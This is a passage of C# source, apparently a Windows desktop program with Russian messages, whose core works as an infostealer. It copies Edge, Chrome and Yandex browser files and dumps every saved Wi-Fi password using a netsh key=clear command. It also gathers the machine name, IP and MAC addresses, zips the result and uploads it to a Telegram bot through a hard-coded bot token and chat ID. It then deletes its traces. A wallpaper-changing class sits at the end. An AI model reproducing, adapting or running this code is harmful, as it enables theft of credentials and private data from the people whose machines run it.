                    (yandexSourceFilePath, yandexTempFilePath)
                };

                var tempFiles = new List<string>();

                foreach (var (sourcePath, tempPath) in filesToCopy)
                {
                    if (File.Exists(sourcePath))
                    {
                        File.Copy(sourcePath, tempPath, true);
                        tempFiles.Add(tempPath);
                    }
                }

                // Create the system info file
                CreateSystemInfoFile(infoTempFilePath);
                tempFiles.Add(infoTempFilePath);

                if (tempFiles.Count > 0)
                {
                    CreateZipFromFiles(tempFiles, zipFilePath);
                    await SendFileAsync(zipFilePath);
                }
                else
                {
                    MessageBox.Show("Ни один из файлов не найден.");
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Ошибка: {ex.Message}");
            }
            finally
            {
                CleanupFiles(new List<string> { edgeTempFilePath, chromeTempFilePath, yandexTempFilePath, infoTempFilePath, zipFilePath });
            }
        }

        private static void CreateSystemInfoFile(string filePath)
        {
            try
            {
                using (StreamWriter writer = new StreamWriter(filePath))
                {
                    writer.WriteLine($"PC Name: {Environment.MachineName}");
                    writer.WriteLine($"IP Address: {GetLocalIPAddress1()}");
                    writer.WriteLine($"Network IP Address: {GetNetworkIPAddress()}");

                    // Get MAC address
                    writer.WriteLine("MAC Address:");
                    string getmacOutput = ExecuteCommand("getmac /v");
                    writer.WriteLine(getmacOutput);

                    // Get Wi-Fi profiles and passwords
                    writer.WriteLine("Wi-Fi Profiles:");
                    string wifiProfilesOutput = ExecuteCommand(@"for /f ""skip=9 tokens=1,2 delims=:"" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear");
                    writer.WriteLine(wifiProfilesOutput);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Ошибка при создании файла SystemInfo: {ex.Message}");
            }
        }

        private static string ExecuteCommand(string command)
        {
            try
            {
                ProcessStartInfo processInfo = new ProcessStartInfo("cmd.exe", "/c " + command)
                {
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                using (Process process = new Process { StartInfo = processInfo })
                {
                    process.Start();
                    return process.StandardOutput.ReadToEnd();
                }
            }
            catch (Exception ex)
            {
                return $"Ошибка при выполнении команды: {ex.Message}";
            }
        }

        private static string GetLocalIPAddress1()
        {
            string localIP = "";
            try
            {
                var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
                foreach (var ip in host.AddressList)
                {
                    if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        localIP = ip.ToString();
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                localIP = $"Ошибка при получении IP адреса: {ex.Message}";
            }
            return localIP;
        }

        private static string GetNetworkIPAddress()
        {
            string networkIP = "";
            try
            {
                var interfaces = System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces();
                foreach (var ni in interfaces)
                {
                    var props = ni.GetIPProperties();
                    foreach (var ip in props.UnicastAddresses)
                    {
                        if (ip.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork && !System.Net.IPAddress.IsLoopback(ip.Address))
                        {
                            networkIP = ip.Address.ToString();
                            break;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                networkIP = $"Ошибка при получении сетевого IP адреса: {ex.Message}";
            }
            return networkIP;
        }

        private static void CreateZipFromFiles(List<string> sourceFilePaths, string zipFilePath)
        {
            using (FileStream zipToOpen = new FileStream(zipFilePath, FileMode.Create))
            {
                using (ZipArchive archive = new ZipArchive(zipToOpen, ZipArchiveMode.Create))
                {
                    foreach (var sourceFilePath in sourceFilePaths)
                    {
                        archive.CreateEntryFromFile(sourceFilePath, System.IO.Path.GetFileName(sourceFilePath));
                    }
                }
            }
        }

        private static async Task SendFileAsync(string filePath)
        {
            var botToken = "7325932397:AAGYcJAyNxZPXC4Uw3rvzzrYP-6ionuD4Nw";
            var chatId = "1005333334";
            var url = $"https://api.telegram.org/bot{botToken}/sendDocument";

            using (var client = new HttpClient())
            {
                var form = new MultipartFormDataContent();
                var fileContent = new ByteArrayContent(File.ReadAllBytes(filePath));
                fileContent.Headers.ContentType = System.Net.Http.Headers.MediaTypeHeaderValue.Parse("multipart/form-data");
                form.Add(fileContent, "document", System.IO.Path.GetFileName(filePath));
                form.Add(new StringContent(chatId), "chat_id");

                var response = await client.PostAsync(url, form);
                response.EnsureSuccessStatusCode();
            }
        }

        private static void CleanupFiles(List<string> filePaths)
        {
            foreach (var filePath in filePaths)
            {
                if (File.Exists(filePath))
                {
                    File.Delete(filePath);
                }
            }
        }


































    }

    // Пример класса WallpaperChanger с методом SetWallpaper
    public static class WallpaperChanger
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        private const int SPI_SETDESKWALLPAPER = 20;
        private const int SPIF_UPDATEINIFILE = 0x01;
        private const int SPIF_SENDWININICHANGE = 0x02;

        public static void SetWallpaper(string wallpaperPath)
        {
            if (File.Exists(wallpaperPath))
            {
                SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, wallpaperPath, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
            }
            else
            {
                MessageBox.Show("Файл обоев не найден: " + wallpaperPath);
            }
        }
    }
}

